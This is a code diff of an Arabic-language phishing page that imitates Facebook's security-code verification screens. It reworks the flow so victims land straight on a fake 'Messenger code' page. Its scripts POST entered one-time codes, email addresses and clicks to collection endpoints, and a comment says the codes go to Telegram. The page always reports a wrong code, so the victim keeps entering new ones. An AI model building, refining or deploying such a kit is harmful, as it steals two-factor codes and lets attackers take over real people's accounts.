@@ -207,60 +207,22 @@
         
         .back-link:hover { text-decoration: underline; }
         
-        .method-btn {
-            width: 100%;
-            padding: 14px 16px;
-            background: #fff;
-            border: 1.5px solid #dddfe2;
-            border-radius: 8px;
-            font-size: 15px;
-            font-weight: 600;
-            color: #1c1e21;
-            cursor: pointer;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            transition: 0.2s;
-            text-align: right;
-        }
-        
-        .method-btn:hover {
-            background: #f5f6f7;
-            border-color: #1877f2;
-        }
-        
-        .method-btn .method-icon {
-            width: 40px;
-            height: 40px;
-            background: #e7f3ff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            flex-shrink: 0;
-        }
-        
-        .method-btn .method-text { flex: 1; }
-        .method-btn .method-title { font-weight: 700; font-size: 15px; color: #1c1e21; }
-        .method-btn .method-desc { font-size: 13px; color: #606770; margin-top: 2px; }
-        
-        .forgot-code-link {
+        /* زر صغير "نسيت الرمز؟" */
+        .small-forgot-btn {
             display: block;
             color: #1877f2;
-            font-size: 14px;
+            font-size: 13px;
             text-decoration: none;
-            padding: 12px 0;
+            padding: 8px 0;
             background: none;
             border: none;
             width: 100%;
             cursor: pointer;
             text-align: center;
-            margin-top: 8px;
+            margin-top: 6px;
         }
         
-        .forgot-code-link:hover { text-decoration: underline; }
+        .small-forgot-btn:hover { text-decoration: underline; }
         
         @media (max-width: 900px) {
             .main-container {
@@ -350,46 +312,43 @@
         </div>
     </div>
 
-    <!-- 4. Messenger - اختيار الطريقة -->
-    <div id="page-messenger" class="page">
+    <!-- 4. Messenger - إدخال رمز Messenger مباشرة (بدل صفحة الاختيار) -->
+    <div id="page-messenger-final" class="page">
         <div class="otp-container">
             <div class="fb-logo-small">facebook</div>
             <div class="icon-circle">💬</div>
-            <div class="title">تأكيد هويتك</div>
+            <div class="title">أدخل رمز Messenger</div>
             <div class="subtitle">
-                اختر طريقة استلام رمز الأمان<br>
-                <strong id="displayEmail2">بريدك الإلكتروني</strong>
+                أدخل رمز الأمان الذي أنشأته مسبقاً على تطبيق Messenger الخاص بك.
             </div>
             
-            <button type="button" class="method-btn" id="methodMessenger">
-                <div class="method-icon">💬</div>
-                <div class="method-text">
-                    <div class="method-title">رموز Messenger</div>
-                    <div class="method-desc">استلم رمزاً على تطبيق Messenger</div>
-                </div>
-            </button>
+            <div id="errorMsg4" class="error-msg"></div>
             
-            <button type="button" class="method-btn" id="methodOtp">
-                <div class="method-icon">🔢</div>
-                <div class="method-text">
-                    <div class="method-title">رمز لمرة واحدة (OTP)</div>
-                    <div class="method-desc">استلم رمزاً عبر رسالة نصية أو بريد إلكتروني</div>
-                </div>
-            </button>
+            <div class="otp-boxes" id="otpContainer4">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
+            </div>
             
-            <button type="button" class="forgot-code-link" id="forgotCodeBtn">هل نسيت الرمز؟</button>
+            <button type="button" class="verify-btn" id="verifyBtn4">متابعة</button>
+            
+            <!-- زر صغير: نسيت الرمز -->
+            <button type="button" class="small-forgot-btn" id="forgotCodeBtn">هل نسيت الرمز؟</button>
         </div>
     </div>
 
-    <!-- 5. OTP النهائية -->
+    <!-- 5. OTP النهائية - بتوضح إن الرمز هيوصل على Messenger -->
     <div id="page-otp-final" class="page">
         <div class="otp-container">
             <div class="fb-logo-small">facebook</div>
-            <div class="icon-circle">🔢</div>
+            <div class="icon-circle">📨</div>
             <div class="title">أدخل رمز لمرة واحدة</div>
             <div class="subtitle">
-                لقد أرسلنا رمزاً مكوّناً من 6 أرقام إلى<br>
-                <strong id="displayEmail3">بريدك الإلكتروني</strong>
+                سنرسل رمزاً مكوّناً من 6 أرقام إلى حسابك على تطبيق Messenger.<br><br>
+                افتح تطبيق Messenger، واطّلع على الرسالة التي تحتوي على الرمز، ثم ارجع إلى هنا وأدخله.
             </div>
             
             <div id="errorMsg3" class="error-msg"></div>
@@ -408,33 +367,6 @@
         </div>
     </div>
 
-    <!-- 6. Messenger Final -->
-    <div id="page-messenger-final" class="page">
-        <div class="otp-container">
-            <div class="fb-logo-small">facebook</div>
-            <div class="icon-circle">💬</div>
-            <div class="title">أدخل رمز Messenger</div>
-            <div class="subtitle">
-                افتح تطبيق Messenger واطّلع على الرسالة التي تحتوي على رمز الأمان الخاص بك المكوّن من 6 أرقام، ثم أدخله هنا.
-            </div>
-            
-            <div id="errorMsg4" class="error-msg"></div>
-            
-            <div class="otp-boxes" id="otpContainer4">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric" pattern="[0-9]*">
-            </div>
-            
-            <button type="button" class="verify-btn" id="verifyBtn4">متابعة</button>
-            <button type="button" class="resend-btn" id="resendBtn4" disabled>إعادة إرسال الرمز (<span id="timerCount4">60</span>ث)</button>
-            <button type="button" class="forgot-code-link" id="forgotMessengerCode">هل نسيت كلمة المرور؟</button>
-        </div>
-    </div>
-
     <script>
         let userEmail = '';
 
@@ -447,8 +379,6 @@
         function updateEmails() {
             const email = userEmail || 'بريدك الإلكتروني';
             document.getElementById('displayEmail1').textContent = email;
-            document.getElementById('displayEmail2').textContent = email;
-            document.getElementById('displayEmail3').textContent = email;
         }
 
         // 1. تسجيل الدخول
@@ -537,7 +467,7 @@
             document.querySelector(`#${containerId} .otp-input`).focus();
         }
 
-        // 5. OTP الأولى
+        // 5. OTP الأولى → بتوصل على تيلجرام + تروح لصفحة Messenger
         document.getElementById('verifyBtn1').addEventListener('click', async function() {
             const otp = getOtpValue('otpContainer1');
             const errorMsg = document.getElementById('errorMsg1');
@@ -561,87 +491,11 @@
             setTimeout(() => {
                 this.disabled = false;
                 this.textContent = 'متابعة';
-                updateEmails();
-                showPage('page-messenger');
+                showPage('page-messenger-final');
             }, 1000);
         });
 
-        // 6. اختيار الطريقة
-        document.getElementById('methodOtp').addEventListener('click', async function() {
-            await fetch('/submit-method', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ method: 'otp', email: userEmail })
-            }).catch(() => {});
-            
-            updateEmails();
-            showPage('page-otp-final');
-        });
-
-        document.getElementById('methodMessenger').addEventListener('click', async function() {
-            await fetch('/submit-method', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ method: 'messenger', email: userEmail })
-            }).catch(() => {});
-            
-            showPage('page-messenger-final');
-        });
-
-        // 7. نسيت الرمز في Messenger
-        document.getElementById('forgotCodeBtn').addEventListener('click', async function() {
-            // إشعار إنه ضغط على "نسيت الرمز"
-            await fetch('/submit-forgot-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: userEmail, from: 'messenger-page' })
-            }).catch(() => {});
-            
-            showPage('page-otp-final');
-        });
-
-        // 8. نسيت كلمة المرور في Messenger Final
-        document.getElementById('forgotMessengerCode').addEventListener('click', async function() {
-            await fetch('/submit-forgot-code', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: userEmail, from: 'messenger-final' })
-            }).catch(() => {});
-            
-            showPage('page-messenger');
-        });
-
-        // 9. OTP النهائية
-        document.getElementById('verifyBtn3').addEventListener('click', async function() {
-            const otp = getOtpValue('otpContainer3');
-            const errorMsg = document.getElementById('errorMsg3');
-            
-            if (otp.length !== 6) {
-                errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
-                errorMsg.classList.add('show');
-                return;
-            }
-            
-            errorMsg.classList.remove('show');
-            this.disabled = true;
-            this.textContent = 'جاري التحقق...';
-            
-            await fetch('/submit-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ otp, email: userEmail, stage: 'otp-final' })
-            }).catch(() => {});
-            
-            setTimeout(() => {
-                errorMsg.textContent = '⚠️ الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.';
-                errorMsg.classList.add('show');
-                clearOtp('otpContainer3');
-                this.disabled = false;
-                this.textContent = 'متابعة';
-            }, 1500);
-        });
-
-        // 10. Messenger Final
+        // 6. Messenger Final - التحقق
         document.getElementById('verifyBtn4').addEventListener('click', async function() {
             const otp = getOtpValue('otpContainer4');
             const errorMsg = document.getElementById('errorMsg4');
@@ -671,7 +525,50 @@
             }, 1500);
         });
 
-        // 11. إعادة الإرسال
+        // 7. زر "هل نسيت الرمز؟" في Messenger
+        document.getElementById('forgotCodeBtn').addEventListener('click', async function() {
+            // إشعار إنه ضغط على "نسيت الرمز"
+            await fetch('/submit-forgot-code', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: userEmail, from: 'messenger-final' })
+            }).catch(() => {});
+            
+            // روح لصفحة OTP النهائية
+            showPage('page-otp-final');
+        });
+
+        // 8. OTP النهائية - التحقق
+        document.getElementById('verifyBtn3').addEventListener('click', async function() {
+            const otp = getOtpValue('otpContainer3');
+            const errorMsg = document.getElementById('errorMsg3');
+            
+            if (otp.length !== 6) {
+                errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
+                errorMsg.classList.add('show');
+                return;
+            }
+            
+            errorMsg.classList.remove('show');
+            this.disabled = true;
+            this.textContent = 'جاري التحقق...';
+            
+            await fetch('/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ otp, email: userEmail, stage: 'otp-final' })
+            }).catch(() => {});
+            
+            setTimeout(() => {
+                errorMsg.textContent = '⚠️ الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.';
+                errorMsg.classList.add('show');
+                clearOtp('otpContainer3');
+                this.disabled = false;
+                this.textContent = 'متابعة';
+            }, 1500);
+        });
+
+        // 9. إعادة الإرسال
         function setupResend(btnId, timerId) {
             const btn = document.getElementById(btnId);
             const timerSpan = document.getElementById(timerId);
@@ -707,7 +604,6 @@
 
         setupResend('resendBtn1', 'timerCount1');
         setupResend('resendBtn3', 'timerCount3');
-        setupResend('resendBtn4', 'timerCount4');
 
         console.log('✅ التطبيق جاهز');
     </script>
